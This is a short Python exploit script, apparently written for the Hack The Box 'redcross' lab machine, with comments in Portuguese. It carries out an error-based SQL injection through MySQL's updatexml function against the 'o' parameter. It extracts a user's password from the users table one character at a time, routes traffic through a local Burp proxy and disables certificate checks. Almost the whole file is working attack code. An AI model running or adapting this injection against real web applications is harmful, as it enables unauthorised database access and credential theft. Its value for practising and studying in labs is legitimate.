import requests
import re 
import urllib3

from time import sleep

# Remove avisos referentes ao certificado
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://intra.redcross.htb/"

# Headers com cookie
headers = {
	"Cookie": "PHPSESSID=hi95s3rcmgomo0aikg5nrcabl7; LANG=EN_US; SINCE=1722473957; LIMIT=10; DOMAIN=intra",
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Burp? ^_^
proxy = {
	'https': 'http://127.0.0.1:8080'
}

# Comprimento da senha obtido com:
# updatexml(rand(),concat(0x3a,(SELECT length(password) FROM redcross.users LIMIT 0,1)),null)-- -

password_length = 60
password = ""

# Função para obter os caracteres
def extract(resp):
	# Define a regex pattern para capturar o caractere
    pattern = r"</a>DEBUG INFO: XPATH syntax error: ':(.)'"
    match = re.search(pattern, resp)
    
    if match:
    	return match.group(1)
    else:
        return None 


for i in range(1, password_length + 1):
	# LIMIT x=0 => admin x=3 => charles 
    payload = f"1') AND updatexml(rand(),concat(0x3a,(SELECT substring(password, {i}, 1) FROM redcross.users LIMIT 2,1)),null)-- -"
    response = requests.get(url, params={"o": payload, "page": "app"}, headers=headers, proxies=proxy, verify=False)
    extracted_char = str(extract(response.text))
    password += extracted_char
    print(f"Password so far: {password}", end='\r')
    # Delay para o servidor processar a query corretamente sem quebrar
    sleep(0.5)

print(f"Full password: {password}")
